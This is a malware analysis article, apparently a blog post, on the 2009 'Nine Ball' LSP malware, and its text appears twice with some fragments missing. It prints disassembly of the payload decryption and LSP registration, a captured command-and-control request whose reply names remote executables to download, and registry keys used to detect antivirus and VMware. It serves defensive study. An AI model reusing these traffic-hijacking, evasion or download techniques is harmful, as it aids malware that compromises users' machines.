@@ -1,0 +1,157 @@
+It all started when reports started to come from WebSense that more than 40,000 legitimate web sites had been compromised by a new wave of attacks being dubbed as 'Nine Ball'.
+Initial reports did not have enough details to help identify the malware behind these attacks.
+Luckily soon after, Andrew Martin came up with a very good write up about the malware behind the scenes.
+My article is an extension of Martin's initial analysis.
+I'll try to concentrate on aspects of this malware not already covered.
+From Andrew's analysis, I was able to find the md5 of the parent malware (the one which is dropped by web exploit(s)).
+It was enough to give me a good starting point.
+The malware (32b7671aab9a5b8cf17d8eeb0993a266) was found to be packed with 'ASPack'.
+Upon execution this binary extracts two files out if its resource section and copies them under %SYSTEM%.SOCKET2w.DLL: efe928d8f1c0fd75b72f69f6eb874f53SPORDER.DLL : a082e5473b2a9a4d846ed7ddf637ac76Without diving into a deep analysis, the names of these dll files are enough to give a hint about the underlying functionality.
+"SPORDER.DLL" is a legitimate API set provided by Microsoft (part of Platform SDK which doesn't come with the standard Windows installation) to help install additional layered service providers (LSP).
+In windows LSPs are a layer between WINSOCK2 and lower level transport services like TCP/IP.
+In short LSPs give a way to intercept the traffic going in or out of the system.
+All the transport level WINSOCK API calls will eventually be redirected to a chain of installed LSPs APIs.
+The SPI (service provider interface) was actually designed to enhance the capability of the Windows WINSOCK interface but due to its capability to intercept network traffic at user space, many malware started using it for traffic sniffing.Initially I thought SOCKET2w.DLL was the malware LSP module (LSPs exist in the form of dlls) containing all the logic but this was not completely true.
+It's an encrypted form of the actual LSP dll.
+It happens like this, after SOCKET2w.dll is extracted from the resource section, its contents are decrypted and stored in a new file with the name of SOCKET2.DLL.
+This is the actual PE file which will be installed as LSP on the infected system later on.
+The decryption logic looks like this:Every byte of SOCKET2w.DLL is xored with one byte from a magic number 0x1F90FEB cyclically.
+byte[0] ^= 0xEB;byte[1] ^= 0x0F;byte[2] ^= 0xF9;byte[3] ^= 0x01;byte[4] ^= 0xEB; // BACK TO FIRST BYTEbyte[5] ^= 0x0F ..and so onThe real implementation looks like this:.text:00401B54 sub esp, 10h.text:00401B57 mov ecx, [esp+10h+arg_4].text:00401B5B test ecx, ecx.text:00401B5D jbe short loc_401BA2.text:00401B5F xor edx, edx.text:00401B61 mov eax, 1.text:00401B66 mov [esp+10h+var_4], ebx.text:00401B6A mov [esp+10h+var_8], esi.text:00401B6E mov [esp+10h+var_C], edi.text:00401B72 mov [esp+10h+var_10], ebp.text:00401B75 mov ebp, [esp+10h+arg_8].text:00401B79 mov esi, [esp+10h+arg_0].text:00401B7D.text:00401B7D loc_401B7D: .text:00401B7D movzx ebx, byte ptr [eax+ebp-1].text:00401B82 xor [edx+esi], bl.text:00401B85 cmp eax, [esp+10h+arg_C].text:00401B89 jnz short loc_401B8D.text:00401B8B xor eax, eax.text:00401B8D.text:00401B8D loc_401B8D: .text:00401B8D inc edx.text:00401B8E inc eax.text:00401B8F cmp edx, ecx.text:00401B91 jb short loc_401B7D.text:00401B93 mov ebx, [esp+10h+var_4].text:00401B97 mov esi, [esp+10h+var_8].text:00401B9B mov edi, [esp+10h+var_C].text:00401B9F mov ebp, [esp+10h+var_10].text:00401BA2.text:00401BA2 loc_401BA2: .text:00401BA2 mov eax, 1.text:00401BA7 add esp, 10h.text:00401BAA retn 10h.text:00401BAA sub_401B54 endpSOCKET2.DLL is further registered as a non IFS based Layered Service Provider..text:0040152B push offset LibFileName ; "sporder.dll".text:00401530 call ds:LoadLibraryA.text:00401536 mov dword_405040, eax.text:0040153B test eax, eax.text:0040153D jz short loc_40155A.text:0040153F push offset ProcName ; "WSCWriteProviderOrder".text:00401544 push eax ; hModule.text:00401545 call ds:GetProcAddress.text:0040154B mov dword_405124, eax.text:00401550 xor edx, edx.text:00401552 test eax, eax.text:00401554 setnz dl.text:00401557 mov eax, edx.text:00401559 retn .text:00401B28 push edx .text:00401B29 mov edx, [ebp+Memory].text:00401B2C push edx .text:00401B2D call dword_405124What this means is that whenever any user level application tries to use the WINSOCK interface, SOCKET2.DLL will get loaded automatically into that process's address space.
+It gives this malware a root kit functionality as well as ability to intercept network traffic at the user space level.
+To invoke the malware instance, I launched a telnet session to www.google.com from the infected PC.
+It resulted in loading SOCKET2.DLL into the telnet process space.
+Right after that, I observed an outbound cnc communication:GET /zub/zc.php?l=US&d=EC4E4AF4EA4A44D19568ADB88998D52A&v=3.15.3&sft=AAAAAAAAA&rvz1=41&rvz2=0000597198 HTTP/1.1Host: trafficshop.twHTTP/1.1 200 OKDate: Fri, 19 Jun 2009 17:54:32 GMTServer: Apache/2X-Powered-By: PHP/5.2.9Vary: Accept-Encoding,User-AgentContent-Length: 1322Content-Type: text/html#U1:http://orep.tw/socks.exe#U1:http://orep.tw/sever.exe#U1:http://orep.tw/ic.exe#U;: | |ADVERTISING|--------------------------------------------| | |Men and Woman Health T.a.b.s.| |Health&Care online Shop.|Low pricing, discounts, flawless customer support.
+New discounts and special offers !| |http://www.webo.tw||--------------------------------------------|%%#U7: | |ADVERTISING|--------------------------------------------| | |Men and Woman Health T.a.b.s.| |Health&Care online Shop.|Low pricing, discounts, flawless customer support.
+New discounts and special offers !| |http://www.webo.tw||--------------------------------------------|%%#U?
+: | |ADVERTISING|--------------------------------------------| | |Men and Woman Health T.a.b.s.| |Health&Care online Shop.|Low pricing, discounts, flawless customer support.
+New discounts and special offers !| |http://www.webo.tw||--------------------------------------------|%%#U=: | |FORUM ADVERTISING|--------------------------------------------||[URL=http://www.best-med-shop.com] ||Canadian medicine and pharmacy is most professional.
+Generic pills.
+High qulity and lowest price.||Viagra, Cialis, Levitra, Propecia, Champix, Tamiflu, Xenical, Reductil, Intrinsa.... [/url]|||http://www.best-med-shop.com||--------------------------------------------%%There are two things which are clearly visible from the above communication:1.
+This malware has quite a robust download mechanism.
+Which could be used for the malware update itself or for dropping other malware onto the infected system.2.
+It has something to do with advertisements.
+As a matter of fact its existence at the LSP layer is giving it a very powerful capability to inject these fake advertisements into any legitimate session.
+If we see the code structure inside SOCKET2.DLL, it can logically be divided into two parts.
+1.
+Command and control coordination module.2.
+Network session manipulation/hijacking (actual payload).Almost all the CnC coordination and initial setup logic can be found in 'DllMain'.
+The first few statements in DllMain try to check the name of the current process.
+If the current instance is one of these processes,1.svhost.exe2.lsass.exe3.
+winlogon.exe4.alg.exe5.norun.exeDllMain returns without doing anything, passing control gracefully to the lower level LSPs.
+It's a deliberate attempt by SOCKET2.DLL not to inject itself in the critical system processes.
+If the running process is not one of the above mentioned processes it generates a unique 32 character User ID and writes it under HKEY_LOCAL_MACHINE\SOFTWARE\\MICROSOFT\\WINDOWS SUID= 32 character stringThis SUID is calculated with the help of these two APIsCoCreateGuidStringFromGUID2The SUID will consist of the first 32 non null characters returned by 'StringFromGUID2' excluding the first non null character '{'.A typical SUID instance will look like this 'EC4E4AF4EA4A44D19568ADB88998D52A'After setting the 'SUID' value, another registry value 'IVS' of dword type is created under 'HKEY_LOCAL_MACHINE\SOFTWARE\\MICROSOFT\\WINDOWS' and is initialized with 0.
+IVS is a persistent variable which is incremented every time a unique session is intercepted by the SOCKET2.DLL (which will be discussed later on).
+After creating the above mentioned registry keys, a mutex is checked/created with the name of 'Global\FGVVSDSGBB'.
+If the mutex is not already present (from a previous instance of SOCKET2.DLL) the code starts preparing itself for CnC communication.
+GET/zub/zc.php?l=US&d=EC4E4AF4EA4A44D19568ADB88998D52A&v=3.15.3&sft=AAAAAAAAA&rvz1=41&rvz2=0000597198HTTP/1.1Host: trafficshop.twIn this process, different system attributes are retrieved and sent back to the CnC server in the form of 'HTTP GET' parameters.
+Let's start finding out how the above mentioned GET request is formulated.1.
+the host 'trafficshop.tw' and the first part of URI (/zub/zc.php) are hard coded in the code.
+2.
+'l=' describes the user's locale , retrieved from the 'GetLocaleInfoA' API.3.
+'d=' is a 32 character 'SUID' as discussed above.
+It probably helps the botmaster count the number of unique zombies.
+4.
+'v=' at this location a hard coded string "3.15.3" is always supplied.5.
+'sft=' represents an interesting malware feature, its ability to check the installation of a large array of security products on the infected system.
+Once this information is retrieved it is sent back to the CnC server inside the 'sft=' value.
+Each character in the value string represents the existence of a particular security product on the infected system.
+The absence of any any particular AV package will result in sending 'A' instead.
+It does so by probing different registry keys created by different AV suites like:HKLM\Software\KasperskyLabHKLM\Software\McAfee\VirusScanHKLM\Software\Symantec\Symantec AntiVirusHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\AntiVir PersonalEdition ClassicHKLM\SYSTEM\ControlSet001\Services\avgntfltHKLM\Software\ALWIL Software\AvastHKLM\Software\Doctor Web, Ltd.HKLM\Software\Panda SoftwareHKLM\Software\FRISK Software InternationalHKLM\Software\Ukranian Antivirus centerHKLM\Software\SOFTWIN\BitDefender Desktop\Maintenance\InstallHKLM\Software\PepiMK Software\SpybotSnDHKLM\Software\Arovax AntiSpywareHKLM\Software\Grisoft\AVGAntiSpywareHKLM\Software\ComputerAssociates\eTrustPestPatrolHKLM\Software\McAfee\McAfee AntiSpywareHKLM\Software\Spyware Begone!HKLM\Software\Chilkat Software, Inc.HKLM\SYSTEM\CurrentControlSet\Services\WinDefendNot only does it detect security products but it also tries to check for the existence of VmWare by checking the following key.
+HKLM\Software\VMware, Inc.Please note here that checking these security product installations is only done once.
+A registry value HKEY_LOCAL_MACHINE\SOFTWARE\\MICROSOFT\\WINDOWS sft=is checked first.
+If this registry value is already set then this process is skipped, otherwise the AVs existence will be checked and afterward the 'sft' value will be set to 'x'.
+.text:10001E71 push edx ; lpData.text:10001E72 push ecx ; lpType.text:10001E73 push ebx ; lpReserved.text:10001E74 push offset ValueName ; "sft".text:10001E79 push [ebp+hKey] ; hKey.text:10001E7C call ds:RegQueryValueExA.text:10001E82 test eax, eax.text:10001E84 jz loc_10001F70.text:10001E8A push offset Data ; "x".text:10001E8F call ds:lstrlenA.text:10001E95 add eax, 1.text:10001E98 push eax ; cbData.text:10001E99 push offset Data ; "x".text:10001E9E push 1 ; dwType.text:10001EA0 push 0 ; Reserved.text:10001EA2 push offset ValueName ; "sft"
+It all started when reports started to come from WebSense that more than 40,000 legitimate web sites had been compromised by a new wave of attacks being dubbed as 'Nine Ball'.
+Initial reports did not have enough details to help identify the malware behind these attacks.
+Luckily soon after, Andrew Martin came up with a very good write up about the malware behind the scenes.
+My article is an extension of Martin's initial analysis.
+I'll try to concentrate on aspects of this malware not already covered.
+From Andrew's analysis, I was able to find the md5 of the parent malware (the one which is dropped by web exploit(s)).
+It was enough to give me a good starting point.
+The malware (32b7671aab9a5b8cf17d8eeb0993a266) was found to be packed with 'ASPack'.
+Upon execution this binary extracts two files out if its resource section and copies them under %SYSTEM%.
+SPORDER.DLL : a082e5473b2a9a4d846ed7ddf637ac76
+Without diving into a deep analysis, the names of these dll files are enough to give a hint about the underlying functionality.
+"SPORDER.DLL" is a legitimate API set provided by Microsoft (part of Platform SDK which doesn't come with the standard Windows installation) to help install additional layered service providers (LSP).
+In windows LSPs are a layer between WINSOCK2 and lower level transport services like TCP/IP.
+In short LSPs give a way to intercept the traffic going in or out of the system.
+All the transport level WINSOCK API calls will eventually be redirected to a chain of installed LSPs APIs.
+The SPI (service provider interface) was actually designed to enhance the capability of the Windows WINSOCK interface but due to its capability to intercept network traffic at user space, many malware started using it for traffic sniffing.
+Initially I thought SOCKET2w.DLL was the malware LSP module (LSPs exist in the form of dlls) containing all the logic but this was not completely true.
+It's an encrypted form of the actual LSP dll.
+It happens like this, after SOCKET2w.dll is extracted from the resource section, its contents are decrypted and stored in a new file with the name of SOCKET2.DLL.
+This is the actual PE file which will be installed as LSP on the infected system later on.
+The decryption logic looks like this:
+Every byte of SOCKET2w.DLL is xored with one byte from a magic number 0x1F90FEB cyclically.
+byte[0] ^= 0xEB;
+byte[1] ^= 0x0F;
+byte[2] ^= 0xF9;
+byte[3] ^= 0x01;
+byte[4] ^= 0xEB; // BACK TO FIRST BYTE
+byte[5] ^= 0x0F
+and so on
+The real implementation looks like this:
+.text:00401B54 sub esp, 10h.text:00401B57 mov ecx, [esp+10h+arg_4].text:00401B5B test ecx, ecx.text:00401B5D jbe short loc_401BA2.text:00401B5F xor edx, edx.text:00401B61 mov eax, 1.text:00401B66 mov [esp+10h+var_4], ebx.text:00401B6A mov [esp+10h+var_8], esi.text:00401B6E mov [esp+10h+var_C], edi.text:00401B72 mov [esp+10h+var_10], ebp.text:00401B75 mov ebp, [esp+10h+arg_8].text:00401B79 mov esi, [esp+10h+arg_0].text:00401B7D.text:00401B7D loc_401B7D: .text:00401B7D movzx ebx, byte ptr [eax+ebp-1].text:00401B82 xor [edx+esi], bl.text:00401B85 cmp eax, [esp+10h+arg_C].text:00401B89 jnz short loc_401B8D.text:00401B8B xor eax, eax.text:00401B8D.text:00401B8D loc_401B8D: .text:00401B8D inc edx.text:00401B8E inc eax.text:00401B8F cmp edx, ecx.text:00401B91 jb short loc_401B7D.text:00401B93 mov ebx, [esp+10h+var_4].text:00401B97 mov esi, [esp+10h+var_8].text:00401B9B mov edi, [esp+10h+var_C].text:00401B9F mov ebp, [esp+10h+var_10].text:00401BA2.text:00401BA2 loc_401BA2: .text:00401BA2 mov eax, 1.text:00401BA7 add esp, 10h.text:00401BAA retn 10h.text:00401BAA sub_401B54 endp
+SOCKET2.DLL is further registered as a non IFS based Layered Service Provider.
+.text:0040152B push offset LibFileName ; "sporder.dll".text:00401530 call ds:LoadLibraryA.text:00401536 mov dword_405040, eax.text:0040153B test eax, eax.text:0040153D jz short loc_40155A.text:0040153F push offset ProcName ; "WSCWriteProviderOrder".text:00401544 push eax ; hModule.text:00401545 call ds:GetProcAddress.text:0040154B mov dword_405124, eax.text:00401550 xor edx, edx.text:00401552 test eax, eax.text:00401554 setnz dl.text:00401557 mov eax, edx.text:00401559 retn
+.text:00401B28 push edx .text:00401B29 mov edx, [ebp+Memory].text:00401B2C push edx .text:00401B2D call dword_405124What this means is that whenever any user level application tries to use the WINSOCK interface, SOCKET2.DLL will get loaded automatically into that process's address space.
+It gives this malware a root kit functionality as well as ability to intercept network traffic at the user space level.
+To invoke the malware instance, I launched a telnet session to www.google.com from the infected PC.
+It resulted in loading SOCKET2.DLL into the telnet process space.
+Right after that, I observed an outbound cnc communication:
+GET /zub/zc.php?l=US&d=EC4E4AF4EA4A44D19568ADB88998D52A&v=3.15.3&sft=AAAAAAAAA&rvz1=41&rvz2=0000597198 HTTP/1.1Host: trafficshop.twHTTP/1.1 200 OKDate: Fri, 19 Jun 2009 17:54:32 GMTServer: Apache/2X-Powered-By: PHP/5.2.9Vary: Accept-Encoding,User-AgentContent-Length: 1322Content-Type: text/html#U1:http://orep.tw/socks.exe#U1:http://orep.tw/sever.exe#U1:http://orep.tw/ic.exe#U;: | |ADVERTISING|--------------------------------------------| | |Men and Woman Health T.a.b.s.| |Health&Care online Shop.|Low pricing, discounts, flawless customer support.
+New discounts and special offers !| |http://www.webo.tw||--------------------------------------------|%%#U7: | |ADVERTISING|--------------------------------------------| | |Men and Woman Health T.a.b.s.| |Health&Care online Shop.|Low pricing, discounts, flawless customer support.
+New discounts and special offers !| |http://www.webo.tw||--------------------------------------------|%%#U?
+: | |ADVERTISING|--------------------------------------------| | |Men and Woman Health T.a.b.s.| |Health&Care online Shop.|Low pricing, discounts, flawless customer support.
+New discounts and special offers !| |http://www.webo.tw||--------------------------------------------|%%#U=: | |FORUM ADVERTISING|--------------------------------------------||[URL=http://www.best-med-shop.com] ||Canadian medicine and pharmacy is most professional.
+Generic pills.
+High qulity and lowest price.||Viagra, Cialis, Levitra, Propecia, Champix, Tamiflu, Xenical, Reductil, Intrinsa.... [/url]|||http://www.best-med-shop.com||--------------------------------------------%%There are two things which are clearly visible from the above communication:
+1.
+This malware has quite a robust download mechanism.
+Which could be used for the malware update itself or for dropping other malware onto the infected system.
+2.
+It has something to do with advertisements.
+As a matter of fact its existence at the LSP layer is giving it a very powerful capability to inject these fake advertisements into any legitimate session.
+If we see the code structure inside SOCKET2.DLL, it can logically be divided into two parts.
+1.
+Command and control coordination module.
+2.
+Network session manipulation/hijacking (actual payload).
+Almost all the CnC coordination and initial setup logic can be found in 'DllMain'.
+The first few statements in DllMain try to check the name of the current process.
+If the current instance is one of these processes,
+ns without doing anything, passing control gracefully to the lower level LSPs.
+It's a deliberate attempt by SOCKET2.DLL not to inject itself in the critical system processes.
+If the running process is not one of the above mentioned processes it generates a unique 32 character User ID and writes it under
+SUID= 32 character string
+This SUID is calculated with the help of these two APIs
+The SUID will consist of the first 32 non null characters returned by 'StringFromGUID2' excluding the first non null character '{'.
+A typical SUID instance will look like this 'EC4E4AF4EA4A44D19568ADB88998D52A'
+After setting the 'SUID' value, another registry value 'IVS' of dword type is created under 'HKEY_LOCAL_MACHINE\SOFTWARE\\MICROSOFT\\WINDOWS' and is initialized with 0.
+IVS is a persistent variable which is incremented every time a unique session is intercepted by the SOCKET2.DLL (which will be discussed later on).
+After creating the above mentioned registry keys, a mutex is checked/created with the name of 'Global\FGVVSDSGBB'.
+If the mutex is not already present (from a previous instance of SOCKET2.DLL) the code starts preparing itself for CnC communication.
+In this process, different system attributes are retrieved and sent back to the CnC server in the form of 'HTTP GET' parameters.
+Let's start finding out how the above mentioned GET request is formulated.
+1. the host 'trafficshop.tw' and the first part of URI (/zub/zc.php) are hard coded in the code.
+2.
+'l=' describes the user's locale , retrieved from the 'GetLocaleInfoA' API.
+3.
+'d=' is a 32 character 'SUID' as discussed above.
+It probably helps the botmaster count the number of unique zombies.
+4.
+'v=' at this location a hard coded string "3.15.3" is always supplied.
+5.
+'sft=' represents an interesting malware feature, its ability to check the installation of a large array of security products on the infected system.
+Once this information is retrieved it is sent back to the CnC server inside the 'sft=' value.
+Each character in the value string represents the existence of a particular security product on the infected system.
+The absence of any any particular AV package will result in sending 'A' instead.
+It does so by probing different registry keys created by different AV suites like:
+HKLM\Software\KasperskyLabHKLM\Software\McAfee\VirusScanHKLM\Software\Symantec\Symantec AntiVirusHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\AntiVir PersonalEdition ClassicHKLM\SYSTEM\ControlSet001\Services\avgntfltHKLM\Software\ALWIL Software\AvastHKLM\Software\Doctor Web, Ltd.HKLM\Software\Panda SoftwareHKLM\Software\FRISK Software InternationalHKLM\Software\Ukranian Antivirus centerHKLM\Software\SOFTWIN\BitDefender Desktop\Maintenance\InstallHKLM\Software\PepiMK Software\SpybotSnDHKLM\Software\Arovax AntiSpywareHKLM\Software\Grisoft\AVGAntiSpywareHKLM\Software\ComputerAssociates\eTrustPestPatrolHKLM\Software\McAfee\McAfee AntiSpywareHKLM\Software\Spyware Begone!HKLM\Software\Chilkat Software, Inc.HKLM\SYSTEM\CurrentControlSet\Services\WinDefend
+Not only does it detect security products but it also tries to check for the existence of VmWare by checking the following key.
+Please note here that checking these security product installations is only done once.
+A registry value
+is checked first.
+If this registry value is already set then this process is skipped, otherwise the AVs existence will be checked and afterward the 'sft' value will be set to 'x'.
+.text:10001E71 push edx ; lpData.text:10001E72 push ecx ; lpType.text:10001E73 push ebx ; lpReserved.text:10001E74 push offset ValueName ; "sft".text:10001E79 push [ebp+hKey] ; hKey.text:10001E7C call ds:RegQueryValueExA.text:10001E82 test eax, eax.text:10001E84 jz loc_10001F70.text:10001E8A push offset Data ; "x".text:10001E8F call ds:lstrlenA.text:10001E95 add eax, 1.text:10001E98 push eax ; cbData.text:10001E99 push offset Data ; "x".text:10001E9E push 1 ; dwType.text:10001EA0 push 0 ; Reserved.text:10001EA2
+push offset ValueName ; "sft"
